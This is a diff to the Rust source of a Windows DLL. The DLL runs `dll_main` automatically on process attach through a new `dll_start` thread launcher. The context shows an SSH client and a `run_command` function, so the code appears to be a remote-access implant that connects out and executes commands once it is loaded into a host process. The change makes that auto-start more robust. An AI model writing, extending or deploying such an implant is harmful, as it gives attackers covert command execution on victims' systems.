@@ -9,10 +9,12 @@ use std::io;
 use std::io::Write;
 use std::os::raw::c_void;
 use std::process::{Command, exit};
+use std::ptr::null_mut;
 use std::sync::Arc;
 
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::Foundation::{BOOL, HANDLE};
+use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject, INFINITE};
 
 struct Client {}
 impl client::Handler for Client {
@@ -134,7 +136,9 @@ pub fn run_command(command: &str) -> Result<String, io::Error> {
         ))
     }
 }
-
+#[unsafe(no_mangle)]
+#[allow(non_snake_case, unused_variables, unreachable_patterns)]
+#[tokio::main(flavor = "current_thread")]
 pub async fn dll_main() {
     let config = russh::client::Config::default();
     let config = Arc::new(config);
@@ -299,6 +303,36 @@ pub async fn dll_main() {
     debug_println!("Connection closed");
 }
 
+unsafe extern "system" fn dll_main_caller(_param: *mut c_void) -> u32 {
+    dll_main();
+    0
+}
+
+#[cfg(not(target_os = "windows"))]
+pub unsafe extern "system" fn dll_start() {
+    let _ = std::thread::spawn(move || {
+        dll_main();
+    }).join();
+}
+
+
+#[unsafe(no_mangle)]
+#[cfg(target_os = "windows")]
+pub unsafe extern "system" fn dll_start() {
+    // Create a new thread with its own tokio runtime
+    unsafe {
+        let h_thread = CreateThread(
+            null_mut(),
+            0,
+            Some(dll_main_caller),
+            null_mut(),
+            0,
+            null_mut(),
+        );
+        WaitForSingleObject(h_thread, INFINITE);
+    }
+}
+
 #[cfg(target_os = "windows")]
 #[unsafe(no_mangle)]
 #[allow(non_snake_case, unused_variables, unreachable_patterns)]
@@ -310,8 +344,7 @@ pub unsafe extern "system" fn DllMain(
     match call_reason {
         DLL_PROCESS_ATTACH => {
             // Code to run when the DLL is loaded into a process
-            // Initialize resources, etc.
-            dll_main();
+            unsafe { dll_start(); }
         }
         DLL_THREAD_ATTACH => {
             // Code to run when a new thread is created in the process
